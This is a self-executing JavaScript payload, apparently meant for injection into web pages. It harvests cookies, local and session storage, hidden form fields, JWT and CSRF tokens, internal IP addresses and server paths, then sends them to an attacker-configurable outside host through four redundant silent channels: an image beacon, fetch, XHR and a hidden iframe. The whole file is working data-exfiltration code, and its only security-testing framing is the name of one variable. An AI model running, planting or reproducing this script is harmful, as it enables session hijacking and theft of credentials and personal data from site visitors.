(function() {
  // Function to collect server-side information
  function collectServerInfo() {
    // Create an object to store all the information we can gather
    const serverInfo = {
      // Basic environment information
      url: window.location.href,
      domain: document.domain,
      cookies: document.cookie,
      localStorage: JSON.stringify(getLocalStorageItems()),
      sessionStorage: JSON.stringify(getSessionStorageItems()),
      
      // Server information if available
      serverType: getServerHeader(),
      poweredBy: getHeaderValue('X-Powered-By'),
      aspNetVersion: getHeaderValue('X-AspNet-Version'),
      
      // DOM information that might reveal server details
      metaTags: getMetaTags(),
      hiddenFields: getHiddenFields(),
      commentData: getComments(),
      
      // Internal network information if available
      internalIPs: findInternalIPs(),
      internalPaths: findInternalPaths(),
      
      // Authentication and session information
      authTokens: findAuthTokens(),
      
      // Error messages that might contain server info
      errorMessages: getErrorMessages(),
      
      // Server-side includes or template information
      templateInfo: getTemplateInfo(),
      
      // Additional environment data
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString(),
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      referrer: document.referrer
    };
    
    return serverInfo;
  }
  
  // Helper functions to collect specific data
  function getLocalStorageItems() {
    try {
      const items = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        items[key] = localStorage.getItem(key);
      }
      return items;
    } catch (e) {
      return "Access denied";
    }
  }
  
  function getSessionStorageItems() {
    try {
      const items = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        items[key] = sessionStorage.getItem(key);
      }
      return items;
    } catch (e) {
      return "Access denied";
    }
  }
  
  function getServerHeader() {
    // Try to find server info in various places
    const serverInfo = document.querySelector('meta[name="server"]');
    if (serverInfo) return serverInfo.getAttribute('content');
    
    // Look for server info in HTTP headers if we can access them
    return "Unknown";
  }
  
  function getHeaderValue(headerName) {
    // This is a placeholder - we can't directly access HTTP headers from client-side
    // but sometimes they're exposed in the DOM or via other means
    return "Unknown";
  }
  
  function getMetaTags() {
    const metaData = {};
    const metaTags = document.getElementsByTagName('meta');
    
    for (let i = 0; i < metaTags.length; i++) {
      const name = metaTags[i].getAttribute('name') || metaTags[i].getAttribute('property');
      const content = metaTags[i].getAttribute('content');
      if (name && content) {
        metaData[name] = content;
      }
    }
    
    return metaData;
  }
  
  function getHiddenFields() {
    const hiddenFields = {};
    const inputs = document.querySelectorAll('input[type="hidden"]');
    
    for (let i = 0; i < inputs.length; i++) {
      const name = inputs[i].getAttribute('name');
      const value = inputs[i].value;
      if (name) {
        hiddenFields[name] = value;
      }
    }
    
    return hiddenFields;
  }
  
  function getComments() {
    // Extract HTML comments
    const comments = [];
    const nodeIterator = document.createNodeIterator(
      document.documentElement,
      NodeFilter.SHOW_COMMENT,
      { acceptNode: function() { return NodeFilter.FILTER_ACCEPT; } }
    );
    
    let currentNode;
    while (currentNode = nodeIterator.nextNode()) {
      comments.push(currentNode.nodeValue.trim());
    }
    
    return comments;
  }
  
  function findInternalIPs() {
    // Look for internal IPs in the page source
    const content = document.documentElement.outerHTML;
    const ipRegex = /\b(10|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168)(\.\d{1,3}){2}\b/g;
    return content.match(ipRegex) || [];
  }
  
  function findInternalPaths() {
    // Look for server paths in the page source
    const content = document.documentElement.outerHTML;
    const pathRegex = /\/(?:var|etc|usr|home|root|srv|opt|tmp)\/[a-zA-Z0-9\/_.-]+/g;
    return content.match(pathRegex) || [];
  }
  
  function findAuthTokens() {
    // Look for auth tokens in various places
    const tokens = {};
    
    // Check for JWT tokens
    const jwtRegex = /eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}/g;
    const content = document.documentElement.outerHTML;
    tokens.jwt = content.match(jwtRegex) || [];
    
    // Check for CSRF tokens
    const csrfInput = document.querySelector('input[name="csrf_token"], input[name="_csrf"], input[name="__RequestVerificationToken"]');
    if (csrfInput) {
      tokens.csrf = csrfInput.value;
    }
    
    return tokens;
  }
  
  function getErrorMessages() {
    // Find error messages that might contain server info
    const errors = [];
    const errorElements = document.querySelectorAll('.error, .exception, .stack-trace, pre:contains("error"), pre:contains("exception")');
    
    for (let i = 0; i < errorElements.length; i++) {
      errors.push(errorElements[i].textContent.trim());
    }
    
    return errors;
  }
  
  function getTemplateInfo() {
    // Look for template engine fingerprints
    const content = document.documentElement.outerHTML;
    const templateInfo = {};
    
    if (content.includes('{{') && content.includes('}}')) templateInfo.mustache = true;
    if (content.includes('<%') && content.includes('%>')) templateInfo.asp = true;
    if (content.includes('${') && content.includes('}')) templateInfo.jsp = true;
    if (content.includes('th:')) templateInfo.thymeleaf = true;
    if (content.includes('v-')) templateInfo.vue = true;
    if (content.includes('ng-')) templateInfo.angular = true;
    if (content.includes('react-')) templateInfo.react = true;
    
    return templateInfo;
  }
  
  // Function to send data to configured server
  function exfiltrateData(data) {
    // Get base URL from various sources (in order of priority)
    const baseUrl = getBaseUrl();
    
    // Encode the data to make it URL-safe
    const encodedData = encodeURIComponent(JSON.stringify(data));
    
    // Create multiple exfiltration methods for redundancy
    
    // Method 1: Image beacon
    try {
      const img = new Image();
      img.src = `${baseUrl}/exfil?data=${encodedData}`;
    } catch (e) {
      // Silent fail - we have backup methods
    }
    
    // Method 2: Fetch API with POST
    try {
      fetch(`${baseUrl}/api/fingerprint`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
        mode: 'no-cors' // This allows the request to be sent cross-origin
      });
    } catch (e) {
      // Silent fail - we have backup methods
    }
    
    // Method 3: XMLHttpRequest
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `${baseUrl}/api/fingerprint`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify(data));
    } catch (e) {
      // Silent fail - we have backup methods
    }
    
    // Method 4: Create an iframe to a URL with the data
    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = `${baseUrl}/exfil-frame?data=${encodedData}`;
      document.body.appendChild(iframe);
    } catch (e) {
      // Silent fail - we have backup methods
    }
  }
  
  // Function to determine the base URL for data exfiltration
  function getBaseUrl() {
    // Priority order for determining base URL:
    // 1. Explicitly set EXFIL_BASE_URL (can be set by injection)
    // 2. Data attribute on the script tag
    // 3. Environment-style global variable
    // 4. Current domain (for self-hosted scenarios)
    // 5. Fallback to localhost for development
    
    // Check for explicitly set global
    if (typeof window.EXFIL_BASE_URL !== 'undefined' && window.EXFIL_BASE_URL) {
      return window.EXFIL_BASE_URL;
    }
    
    // Check for data attribute on script tag
    try {
      const scripts = document.querySelectorAll('script[src*="test.js"]');
      for (let script of scripts) {
        const baseUrl = script.getAttribute('data-base-url');
        if (baseUrl) {
          return baseUrl;
        }
      }
    } catch (e) {
      // Continue to next method
    }
    
    // Check for environment-style variables
    if (typeof window.SECURITY_FRAMEWORK_URL !== 'undefined' && window.SECURITY_FRAMEWORK_URL) {
      return window.SECURITY_FRAMEWORK_URL;
    }
    
    // Use current domain if we're on the same site
    if (window.location.hostname) {
      const protocol = window.location.protocol;
      const hostname = window.location.hostname;
      const port = window.location.port;
      
      // Build URL with current domain
      let currentUrl = `${protocol}//${hostname}`;
      if (port && port !== '80' && port !== '443') {
        currentUrl += `:${port}`;
      }
      return currentUrl;
    }
    
    // Ultimate fallback for development
    return 'http://localhost:8081';
  }
  
  // Main execution
  try {
    const serverInfo = collectServerInfo();
    exfiltrateData(serverInfo);
  } catch (e) {
    // If something goes wrong, try to send at least the error
    exfiltrateData({ error: e.toString(), partial: true });
  }
})();
